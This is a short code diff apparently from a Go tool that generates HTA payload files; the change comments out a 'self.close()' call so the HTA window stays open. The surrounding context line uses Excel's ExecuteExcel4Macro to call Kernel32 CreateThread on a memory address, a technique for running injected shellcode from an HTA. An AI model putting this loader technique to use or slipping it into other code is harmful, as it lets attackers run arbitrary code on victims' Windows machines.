@@ -57,8 +57,8 @@ func genHTA(_shVar string) string{
 
 	  excelObj.ExecuteExcel4Macro('CALL("Kernel32","CreateThread","JJJJJJJ",0, 0, ' + addr + ', 0, 0, 0)')
 	  
-      //comment if you want to keep the HTA window open.
-      self.close();
+      //uncomment if you want to close the HTA window after execution.
+      //self.close();
 
 	</script>
 
